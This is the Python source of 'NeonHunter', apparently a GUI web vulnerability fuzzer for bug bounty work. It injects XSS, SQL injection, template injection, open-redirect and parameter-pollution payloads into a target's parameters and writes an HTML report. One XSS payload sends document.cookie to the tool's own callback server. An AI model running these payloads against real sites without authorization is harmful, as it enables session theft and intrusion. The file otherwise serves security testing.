import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import requests
from urllib.parse import urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
import threading
import time
import os
from datetime import datetime
import queue as pyqueue
from http.server import HTTPServer, BaseHTTPRequestHandler
import socket
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService  # NEW IMPORT
from webdriver_manager.chrome import ChromeDriverManager
from itertools import cycle
import winsound
import base64

app = None

class BlindCallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<h1>BLIND PAYLOAD HIT! Check NeonHunter log.</h1>")
        if app:
            app.log(f"[!!!] BLIND XSS CALLBACK from {self.client_address[0]} - Payload executed!")
            app.log_live_request('CALLBACK', self.path, 200)

    def log_message(self, format, *args):
        return

class NeonToggle(tk.Canvas):
    def __init__(self, master, variable, command=None, **kwargs):
        super().__init__(master, width=60, height=30, highlightthickness=0, bg='#000000', **kwargs)
        self.var = variable
        self.command = command
        self.state = variable.get()

        self.off_bg = "#110033"
        self.on_bg = "#00ff88"
        self.knob_color = "#ffffff"
        self.glow_color = "#00ffff"
        self.border_color = "#ff00ff"

        self.bind("<Button-1>", self.toggle)
        self.bind("<B1-Motion>", self.toggle)
        variable.trace_add("write", self._on_var_changed)  # Fixed deprecation
        self._draw()

    def _draw(self):
        self.delete("all")
        state = self.var.get()
        bg_color = self.on_bg if state else self.off_bg
        self.create_rectangle(2, 2, 58, 28, fill=bg_color, outline=self.border_color, width=2)
        x = 45 if state else 15
        self.create_oval(x-10, 5, x+10, 25, fill=self.knob_color, outline=self.border_color, width=2)

    def toggle(self, event=None):
        self.var.set(not self.var.get())
        self._draw()
        if self.command:
            self.command()
        if app:
            app.play_click_sound()

    def _on_var_changed(self, *args):
        self._draw()

class NeonHunter:
    def animate_rainbow_border(self):
        self.border_canvas.delete("rainbow")
        w = self.border_canvas.winfo_width()
        h = self.border_canvas.winfo_height()
        if w < 20 or h < 20:
            self.root.after(50, self.animate_rainbow_border)
            return
        thick = self.border_thickness
        seg_angle = 360 / self.border_segments
        offset = self.color_offset
        for i in range(self.border_segments):
            color = next(self.rainbow_colors)
            start = offset + i * seg_angle
            extent = seg_angle
            self.border_canvas.create_arc(0, 0, w, h, start=start, extent=extent, style='arc', outline=color, width=thick, tags="rainbow")
            self.border_canvas.create_arc(thick//2, thick//2, w-thick//2, h-thick//2, start=start, extent=extent, style='arc', outline=color, width=thick//2, tags="rainbow")
        self.color_offset = (self.color_offset + 8) % 360
        self.root.after(60, self.animate_rainbow_border)

    def draw_grid(self):
        self.canvas.delete("grid")
        w = self.canvas.winfo_width()
        h = self.canvas.winfo_height()
        for i in range(0, int(w), 45):
            self.canvas.create_line(i, 0, i, h, fill='#112211', width=1, tags="grid")
        for i in range(0, int(h), 45):
            self.canvas.create_line(0, i, w, i, fill='#112211', width=1, tags="grid")
        self.root.after(120, self.draw_grid)

    def glitch_title(self):
        colors = ['#00ffff', '#ff00ff', '#ffff00', '#00ff88', '#ff6600']
        while True:
            time.sleep(0.1)
            self.title_label.config(fg=colors[int(time.time()*12)%len(colors)])

    def play_click_sound(self):
        try:
            winsound.Beep(1200, 80)
            winsound.Beep(1600, 40)
        except:
            pass

    def play_startup_sound(self):
        try:
            freqs = [800, 1000, 1200, 1600, 2000]
            for f in freqs:
                winsound.Beep(f, 80)
                time.sleep(0.05)
        except:
            pass

    def check_for_updates(self):
        try:
            self.log("🔄 Checking for updates...")
            response = requests.get("https://api.github.com/repos/dkhacker707/NEONHUNTER/releases/latest", timeout=10)
            if response.status_code == 200:
                data = response.json()
                latest = data["tag_name"].lstrip("v")
                current = "3.4"
                if float(latest) > float(current):
                    self.log(f"📈 UPDATE AVAILABLE: v{latest}")
                else:
                    self.log("✅ You are on the latest version")
            else:
                self.log("⚠️ Could not check updates")
        except:
            self.log("⚠️ Update check failed (no internet?)")

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_queue.put(f"[{ts}] {msg}\n")

    def process_queue(self):
        try:
            while not self.log_queue.empty():
                m = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, m)
                self.log_text.see(tk.END)
        except pyqueue.Empty:
            pass
        self.root.after(100, self.process_queue)

    def open_monitor_windows(self):
        if self.live_window and self.live_window.winfo_exists():
            return

        self.live_window = tk.Toplevel(self.root)
        self.live_window.title("LIVE REQUESTS")
        self.live_window.configure(bg='#000000')
        self.live_window.geometry("600x500+50+50")

        tk.Label(self.live_window, text="LIVE REQUESTS", fg='#ff00ff', bg='#000000', font=('Consolas', 14, 'bold')).pack(pady=10)
        self.live_text = scrolledtext.ScrolledText(self.live_window, bg='#000011', fg='#00ff41', font=('Consolas', 9))
        self.live_text.pack(fill='both', expand=True, padx=15, pady=10)

        self.status_window = tk.Toplevel(self.root)
        self.status_window.title("STATUS CODES")
        self.status_window.configure(bg='#000000')
        self.status_window.geometry("400x450+700+50")

        tk.Label(self.status_window, text="ONLY WINS", fg='#ff00ff', bg='#000000', font=('Consolas', 14, 'bold')).pack(pady=10)
        self.status_text = tk.Text(self.status_window, bg='#000011', fg='#00ffff', font=('Consolas', 12, 'bold'))
        self.status_text.pack(fill='both', expand=True, padx=15, pady=10)
        self.status_text.tag_configure("200", foreground="#00ff88", font=('Consolas', 14, 'bold'))
        self.status_text.tag_configure("300", foreground="#ff00ff", font=('Consolas', 14, 'bold'))

    def close_monitor_windows(self):
        if self.live_window:
            self.live_window.destroy()
        if self.status_window:
            self.status_window.destroy()
        self.live_window = self.status_window = self.live_text = self.status_text = None

    def log_live_request(self, method, url, status=None):
        if not self.live_text:
            return
        ts = datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] {method.upper()} → {url}"
        if status is not None:
            line += f" → {status}"
        self.live_text.insert(tk.END, line + "\n")
        self.live_text.see(tk.END)

        if status and (status == 200 or 300 <= status < 400):
            tag = "200" if status == 200 else "300"
            self.status_text.insert(tk.END, f"{status} {'OK' if status == 200 else 'REDIRECT'}\n", tag)
            self.status_text.see(tk.END)

    def clear_monitors(self):
        self.play_click_sound()
        if self.live_text:
            self.live_text.delete(1.0, tk.END)
        if self.status_text:
            self.status_text.delete(1.0, tk.END)
        self.log("Monitors cleared")

    def start_direct_fuzz(self):
        self.play_click_sound()
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Enter target URL")
            return

        self.scan_start_time = datetime.now()
        self.total_payloads_tested = 0
        self.vuln_counter = 0

        self.stop_event.clear()
        self.is_running = True
        self.is_paused = False
        self.fuzz_btn.config(state='disabled')
        self.pause_btn.config(state='normal', text="⏸ PAUSE")
        self.stop_btn.config(state='normal')

        self.open_monitor_windows()
        self.clear_monitors()

        self.progress.start(10)
        self.fuzz_thread = threading.Thread(target=self.direct_fuzz, args=(target,), daemon=True)
        self.fuzz_thread.start()
        self.log(f"FUZZING STARTED: {target}")

    def toggle_pause(self):
        self.play_click_sound()
        if self.is_paused:
            self.is_paused = False
            self.pause_btn.config(text="⏸ PAUSE")
            self.log("Fuzzing resumed")
        else:
            self.is_paused = True
            self.pause_btn.config(text="▶ RESUME")
            self.log("Fuzzing paused")

    def stop_fuzz(self):
        self.play_click_sound()
        self.stop_event.set()
        self.is_running = False
        self.is_paused = False
        self.progress.stop()
        self.fuzz_btn.config(state='normal')
        self.pause_btn.config(state='disabled')
        self.stop_btn.config(state='disabled')
        self.log("Fuzzing stopped by user — monitors remain open")

    def direct_fuzz(self, base_url):
        session = self.get_session()
        delay = self.delay_var.get()
        tested = 0
        found = 0

        parsed = urlparse(base_url)
        params = list(parse_qs(parsed.query).keys())

        if not params:
            try:
                resp = session.get(base_url, timeout=15)
                soup = BeautifulSoup(resp.text, 'html.parser')
                form_params = []
                for form in soup.find_all('form'):
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        name = inp.get('name')
                        if name:
                            form_params.append(name)
                if form_params:
                    params = list(set(form_params))
                    self.log(f"Found form parameters: {params}")
            except Exception as e:
                self.log(f"Form discovery failed: {e}")

        if not params:
            self.log("Using common parameters...")
            params = ['q', 'search', 'id', 'name', 'query', 's', 'keyword', 'page', 'cat', 'category']

        self.log(f"Testing {len(params)} parameters")

        for param in params:
            for vuln, enabled in self.vulns.items():
                if not enabled.get() or self.stop_event.is_set():
                    break
                for payload in self.payloads.get(vuln, []):
                    if self.stop_event.is_set():
                        break
                    while self.is_paused and not self.stop_event.is_set():
                        time.sleep(0.1)

                    tested += 1
                    self.total_payloads_tested += 1
                    time.sleep(delay)

                    test_url = self.build_test_url(base_url, param, payload)

                    try:
                        self.log_live_request('GET', test_url)
                        resp = session.get(test_url, timeout=10, allow_redirects=True)
                        self.log_live_request('GET', test_url, resp.status_code)

                        text = resp.text.lower()
                        final_url = resp.url

                        vuln_found = False
                        if vuln == 'XSS' and payload.lower() in text:
                            vuln_found = True
                        elif vuln == 'SQLi' and any(err in text for err in ['sql syntax', 'mysql', 'syntax error', 'warning: mysql']):
                            vuln_found = True
                        elif vuln == 'SSTI' and ('49' in text or '343' in text or 'config' in text):
                            vuln_found = True
                        elif vuln == 'Open Redirect' and ('google.com' in final_url or 'evil.com' in final_url):
                            vuln_found = True
                        elif vuln == 'HPP' and payload.count('admin') > 0 and 'admin' in text:
                            vuln_found = True

                        if vuln_found:
                            found += 1
                            self.vuln_counter += 1
                            screenshot = self.take_screenshot(test_url, self.vuln_counter)
                            self.results.append({
                                'vuln': vuln,
                                'severity': self.get_severity(vuln),
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'screenshot': screenshot,
                                'poc_number': self.vuln_counter
                            })
                            self.log(f"[VULN {self.vuln_counter}] {vuln} ({self.get_severity(vuln)}) in '{param}'")

                    except Exception as e:
                        self.log_live_request('GET', test_url, "ERROR")

        scan_end_time = datetime.now()
        duration = scan_end_time - self.scan_start_time

        if not self.stop_event.is_set():
            self.progress.stop()
            self.fuzz_btn.config(state='normal')
            self.pause_btn.config(state='disabled')
            self.stop_btn.config(state='disabled')
            self.log(f"SCAN COMPLETE | Duration: {str(duration).split('.')[0]} | Payloads: {self.total_payloads_tested} | Vulnerabilities: {found}")

    def get_severity(self, vuln_type):
        mapping = {
            'XSS': 'Critical',
            'SQLi': 'Critical',
            'SSTI': 'High',
            'Open Redirect': 'Medium',
            'HPP': 'Medium'
        }
        return mapping.get(vuln_type, 'Medium')

    def build_test_url(self, base_url, param, payload):
        parsed = urlparse(base_url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        return parsed._replace(query=urlencode(query, doseq=True)).geturl()

    def start_blind_server(self):
        self.play_click_sound()
        if self.blind_server:
            self.log("Blind server already running")
            return
        threading.Thread(target=self.run_blind_server, daemon=True).start()
        self.log(f"Blind server started → http://{self.callback_ip}:8000")

    def run_blind_server(self):
        global app
        app = self
        self.blind_server = HTTPServer(('0.0.0.0', 8000), BlindCallbackHandler)
        self.blind_server.serve_forever()

    def load_payloads(self):
        self.play_click_sound()
        file = filedialog.askopenfilename()
        if file:
            self.log(f"Payloads loaded: {os.path.basename(file)}")

    def take_screenshot(self, url, poc_num):
        try:
            options = Options()
            options.add_argument("--headless")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")

            service = ChromeService(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)

            driver.get(url)
            time.sleep(3)

            os.makedirs("screenshots", exist_ok=True)
            path = f"screenshots/PoC_{poc_num}.png"
            driver.save_screenshot(path)
            driver.quit()

            self.log(f"📸 PoC_{poc_num}.png saved")
            return path
        except Exception as e:
            self.log(f"⚠️ Screenshot failed: {e}")
            return None

    def get_session(self):
        proxy = self.proxy_entry.get().strip()
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        s = requests.Session()
        s.headers.update({'User-Agent': 'NeonHunter v3.4'})
        if proxies:
            s.proxies.update(proxies)
        return s

    def export_results(self):
        self.play_click_sound()
        if not self.results:
            messagebox.showinfo("No Results", "No vulnerabilities found to export!")
            return

        scan_end_time = datetime.now()
        duration = scan_end_time - (self.scan_start_time or scan_end_time)

        script_dir = os.path.dirname(os.path.abspath(__file__))
        report_path = os.path.join(script_dir, f"NEONHUNTER_REPORT_{scan_end_time.strftime('%Y%m%d_%H%M%S')}.html")

        severity_colors = {
            'Critical': '#ff0000',
            'High': '#ff6600',
            'Medium': '#ffff00',
            'Low': '#00ff00'
        }

        html = f"""
        <html>
        <head>
            <title>NEONHUNTER Professional Report</title>
            <meta charset="UTF-8">
            <style>
                body {{ background: #000; color: #00ff41; font-family: 'Consolas', monospace; padding: 40px; line-height: 1.6; }}
                h1, h2, h3 {{ color: #00ffff; }}
                .header {{ text-align: center; margin-bottom: 50px; border-bottom: 3px solid #ff00ff; padding-bottom: 30px; }}
                .summary {{ background: #110011; padding: 25px; border: 3px solid #00ffff; border-radius: 15px; margin: 40px 0; }}
                .vuln {{ background: #110022; border: 3px solid #ff00ff; margin: 30px 0; padding: 25px; border-radius: 15px; }}
                .severity {{ font-weight: bold; font-size: 20px; padding: 8px 15px; border-radius: 8px; display: inline-block; margin-bottom: 15px; }}
                .screenshot {{ max-width: 100%; border: 4px solid #00ffff; border-radius: 12px; margin: 25px 0; box-shadow: 0 0 20px #00ffff; }}
                .recommendation {{ background: #001100; padding: 15px; border-left: 5px solid #00ff88; margin: 20px 0; }}
                .footer {{ text-align: center; margin-top: 80px; color: #00ff88; font-size: 16px; border-top: 2px solid #ff00ff; padding-top: 30px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🖤 NEONHUNTER PROFESSIONAL SECURITY ASSESSMENT 🖤</h1>
                <h2>Automated Web Vulnerability Scan Report</h2>
                <h3>Generated by Dickson Godwin Massawe</h3>
            </div>

            <div class="summary">
                <h2>EXECUTIVE SUMMARY</h2>
                <p><strong>Target:</strong> {self.target_entry.get() if self.target_entry else 'N/A'}</p>
                <p><strong>Scan Start:</strong> {self.scan_start_time.strftime('%Y-%m-%d %H:%M:%S') if self.scan_start_time else 'N/A'}</p>
                <p><strong>Scan End:</strong> {scan_end_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p><strong>Duration:</strong> {str(duration).split('.')[0]}</p>
                <p><strong>Total Payloads Tested:</strong> {self.total_payloads_tested}</p>
                <p><strong>Critical Vulnerabilities:</strong> {len([r for r in self.results if r['severity'] == 'Critical'])}</p>
                <p><strong>Total Vulnerabilities Found:</strong> {len(self.results)}</p>
            </div>

            <h2>DETAILED FINDINGS</h2>
        """

        description = {
            'XSS': "Cross-Site Scripting allows attackers to inject malicious scripts into web pages viewed by other users.",
            'SQLi': "SQL Injection enables attackers to interfere with database queries, potentially extracting or modifying data.",
            'SSTI': "Server-Side Template Injection allows execution of arbitrary code on the server.",
            'Open Redirect': "Open Redirect can be used in phishing attacks to redirect users to malicious sites.",
            'HPP': "HTTP Parameter Pollution can bypass validation or cause unexpected behavior."
        }

        impact = {
            'XSS': "High - Can lead to session hijacking, defacement, or malware distribution.",
            'SQLi': "Critical - Full database compromise possible.",
            'SSTI': "High - Remote code execution potential.",
            'Open Redirect': "Medium - Facilitates phishing and social engineering.",
            'HPP': "Medium - Can bypass filters or cause logic flaws."
        }

        recommendation = {
            'XSS': "Implement strict output encoding, Content Security Policy (CSP), and input validation.",
            'SQLi': "Use prepared statements, parameterized queries, and ORM frameworks.",
            'SSTI': "Avoid dynamic template rendering with user input. Use safe sandboxed templates.",
            'Open Redirect': "Validate and whitelist allowed redirect destinations.",
            'HPP': "Properly parse and validate all parameters. Avoid duplicate parameter handling."
        }

        for idx, r in enumerate(self.results, 1):
            color = severity_colors.get(r['severity'], '#ffff00')

            screenshot_html = ""
            if r['screenshot'] and os.path.exists(r['screenshot']):
                with open(r['screenshot'], "rb") as img_file:
                    encoded = base64.b64encode(img_file.read()).decode('utf-8')
                screenshot_html = f'<img src="data:image/png;base64,{encoded}" class="screenshot" alt="Proof of Concept {r["poc_number"]}">'

            html += f"""
            <div class="vuln">
                <h2>FINDING {idx}: {r['vuln'].upper()} VULNERABILITY</h2>
                <span class="severity" style="background:{color}; color:#000;">SEVERITY: {r['severity'].upper()}</span>
                <p><strong>Vulnerable URL:</strong> {r['url']}</p>
                <p><strong>Parameter:</strong> <code>{r['param']}</code></p>
                <p><strong>Payload:</strong> <code>{r['payload']}</code></p>
                <p><strong>Description:</strong> {description.get(r['vuln'], 'Parameter vulnerable to injection attack.')}</p>
                <p><strong>Impact:</strong> {impact.get(r['vuln'], 'Medium - Potential for security bypass.')}</p>
                <div class="recommendation">
                    <strong>Recommendation:</strong> {recommendation.get(r['vuln'], 'Implement proper input validation and sanitization.')}
                </div>
                <h3>Proof of Concept (PoC_{r['poc_number']})</h3>
                {screenshot_html}
            </div>
            """

        html += """
            <div class="footer">
                <p><strong>NEONHUNTER v3.4</strong> - Professional Automated Web Vulnerability Scanner</p>
                <p>Developed & Maintained by <strong>Dickson Godwin Massawe</strong></p>
                <p>Report generated on {}</p>
                <p>Hunt ethically. Stay elite. 🏴‍☠️</p>
            </div>
        </body>
        </html>
        """.format(datetime.now().strftime('%B %d, %Y at %H:%M:%S'))

        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(html)

        self.log(f"PROFESSIONAL REPORT GENERATED → {os.path.basename(report_path)}")
        messagebox.showinfo("Report Ready", 
                            f"Professional report with {len(self.results)} findings generated!\n\n"
                            f"File: {os.path.basename(report_path)}\n"
                            f"Location: Script folder\n"
                            f"PoC screenshots: screenshots/PoC_*.png")

    def __init__(self, root):
        global app
        app = self

        self.root = root
        self.root.title("NEONHUNTER v3.4 - Ultimate Bug Bounty Suite")
        self.root.configure(bg='#000000')
        self.root.geometry("1400x800")
        self.root.minsize(1200, 700)

        main_frame = tk.Frame(root, bg='#000000')
        main_frame.pack(fill='both', expand=True, padx=20, pady=20)

        self.border_canvas = tk.Canvas(main_frame, bg='#000000', highlightthickness=0)
        self.border_canvas.place(relwidth=1, relheight=1)
        self.border_thickness = 12
        self.rainbow_colors = cycle(['#ff0000', '#ff6600', '#ffff00', '#00ff00', '#00ccff', '#6600ff', '#ff00ff'])
        self.border_segments = 48
        self.color_offset = 0
        self.animate_rainbow_border()

        self.canvas = tk.Canvas(main_frame, bg='#000000', highlightthickness=0)
        self.canvas.place(relwidth=1, relheight=1)
        self.draw_grid()

        self.title_label = tk.Label(main_frame, text="NEONHUNTER v3.4", font=('Consolas', 36, 'bold'), fg='#00ffff', bg='#000000')
        self.title_label.place(relx=0.5, rely=0.07, anchor='center')
        threading.Thread(target=self.glitch_title, daemon=True).start()

        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Neon.TButton',
                        font=('Consolas', 10, 'bold'),
                        foreground='#00ffff',
                        background='#110033',
                        padding=8)
        style.map('Neon.TButton',
                  background=[('active', '#00ffff')],
                  foreground=[('active', '#000000')])

        style.configure('Neon.TEntry',
                        fieldbackground='#110022',
                        foreground='#00ffcc',
                        insertcolor='#00ffff',
                        borderwidth=2,
                        padding=8,
                        font=('Consolas', 10))

        style.configure('Neon.Horizontal.TProgressbar',
                        background='#00ffff',
                        troughcolor='#110033',
                        thickness=16)

        controls = tk.Frame(main_frame, bg='#000000')
        controls.pack(pady=15, fill='x', padx=40)

        tk.Label(controls, text="Target URL:", fg='#ff00ff', bg='#000000', font=('Consolas', 12)).grid(row=0, column=0, sticky='e', padx=5)
        self.target_entry = tk.Entry(controls, width=70, font=('Consolas', 10), bg='#110022', fg='#00ffcc',
                                    relief='ridge', bd=2, insertbackground='#00ffff')
        self.target_entry.grid(row=0, column=1, padx=10, pady=5, sticky='ew')
        self.target_entry.insert(0, "http://testphp.vulnweb.com/listproducts.php?cat=1")

        tk.Label(controls, text="Delay(s):", fg='#ff00ff', bg='#000000', font=('Consolas', 11)).grid(row=0, column=2, padx=(20,5))
        self.delay_var = tk.DoubleVar(value=0.5)
        tk.Entry(controls, textvariable=self.delay_var, width=6, bg='#110022', fg='#00ffcc').grid(row=0, column=3, padx=5)

        self.fuzz_btn = ttk.Button(controls, text="⚡ START FUZZ", style='Neon.TButton', command=self.start_direct_fuzz)
        self.fuzz_btn.grid(row=0, column=4, padx=12)

        self.pause_btn = ttk.Button(controls, text="⏸ PAUSE", style='Neon.TButton', command=self.toggle_pause, state='disabled')
        self.pause_btn.grid(row=0, column=5, padx=6)

        self.stop_btn = ttk.Button(controls, text="⏹ STOP", style='Neon.TButton', command=self.stop_fuzz, state='disabled')
        self.stop_btn.grid(row=0, column=6, padx=6)

        controls.columnconfigure(1, weight=1)

        extra_frame = tk.Frame(main_frame, bg='#000000')
        extra_frame.pack(pady=10, fill='x', padx=40)

        tk.Label(extra_frame, text="Proxy:", fg='#00ffff', bg='#000000', font=('Consolas', 11)).grid(row=0, column=0, sticky='w')
        self.proxy_entry = tk.Entry(extra_frame, width=30, bg='#110022', fg='#00ffcc', relief='ridge')
        self.proxy_entry.grid(row=0, column=1, padx=10, sticky='w')

        ttk.Button(extra_frame, text="💾 Load Payloads", style='Neon.TButton', command=self.load_payloads).grid(row=0, column=2, padx=15)
        ttk.Button(extra_frame, text="🧹 CLEAR MONITORS", style='Neon.TButton', command=self.clear_monitors).grid(row=0, column=3, padx=15)

        vuln_frame = tk.Frame(main_frame, bg='#000000', relief='ridge', bd=2)
        vuln_frame.pack(pady=15, padx=60, fill='x')

        tk.Label(vuln_frame, text="🛡️ Vulnerabilities to Test", fg='#ff00ff', bg='#000000', font=('Consolas', 14, 'bold')).pack(pady=8)

        toggle_container = tk.Frame(vuln_frame, bg='#000000')
        toggle_container.pack(pady=8)

        self.vulns = {}
        vuln_names = ['XSS', 'SSTI', 'SQLi', 'Open Redirect', 'HPP']
        for i, name in enumerate(vuln_names):
            var = tk.BooleanVar(value=True)
            self.vulns[name] = var
            row = tk.Frame(toggle_container, bg='#000000')
            row.grid(row=i//3, column=i%3, padx=40, pady=8)
            NeonToggle(row, variable=var).pack(side='left')
            tk.Label(row, text=name, fg='#00ffcc', bg='#000000', font=('Consolas', 12, 'bold')).pack(side='left', padx=12)

        btns = tk.Frame(main_frame, bg='#000000')
        btns.pack(pady=12)
        ttk.Button(btns, text="👁️ BLIND SERVER", style='Neon.TButton', command=self.start_blind_server).pack(side='left', padx=30)
        ttk.Button(btns, text="📊 EXPORT REPORT", style='Neon.TButton', command=self.export_results).pack(side='left', padx=30)

        self.progress = ttk.Progressbar(main_frame, orient='horizontal', mode='indeterminate', style='Neon.Horizontal.TProgressbar')
        self.progress.pack(fill='x', padx=80, pady=8)

        log_frame = tk.Frame(main_frame, bg='#000000')
        log_frame.pack(fill='both', expand=True, padx=40, pady=(0, 10))

        self.log_text = scrolledtext.ScrolledText(log_frame, bg='#000011', fg='#00ff41', font=('Consolas', 9),
                                                 insertbackground='#00ffff', relief='ridge', bd=2)
        self.log_text.pack(fill='both', expand=True)

        footer_frame = tk.Frame(root, bg='#000000', height=40)
        footer_frame.pack(side='bottom', fill='x')
        footer_frame.pack_propagate(False)

        self.author_label = tk.Label(footer_frame, text="Author: Dickson Godwin Massawe | GitHub: dkhacker707 | NEONHUNTER v3.4",
                                     font=('Consolas', 9, 'bold'), fg='#00ffcc', bg='#000000')
        self.author_label.pack(pady=10)

        self.live_window = None
        self.status_window = None
        self.live_text = None
        self.status_text = None

        self.fuzz_thread = None
        self.is_running = False
        self.is_paused = False
        self.stop_event = threading.Event()

        self.results = []
        self.log_queue = pyqueue.Queue()
        self.blind_server = None
        self.callback_ip = self.get_local_ip()

        self.scan_start_time = None
        self.total_payloads_tested = 0
        self.vuln_counter = 0

        self.root.after(100, self.process_queue)

        self.payloads = {
            'XSS': ['<script>alert(1)</script>', '"><script>alert(1)</script>', f'<script>fetch("http://{self.callback_ip}:8000/?xss="+document.cookie)</script>'],
            'SSTI': ['{{7*7}}', '${7*7}', '<%=7*7%>', '{{config}}'],
            'SQLi': ['\' OR 1=1--', '1\' WAITFOR DELAY \'0:0:10\'--', '\' UNION SELECT NULL,NULL--'],
            'Open Redirect': ['//google.com', 'https://evil.com', 'javascript:alert(1)'],
            'HPP': ['id=1&id=admin', 'role=user&role=admin'],
        }

        threading.Thread(target=self.check_for_updates, daemon=True).start()
        self.play_startup_sound()
        self.log("🚀 NEONHUNTER v3.4 READY - By Dickson Godwin Massawe")

if __name__ == "__main__":
    root = tk.Tk()
    app = NeonHunter(root)
    root.mainloop()
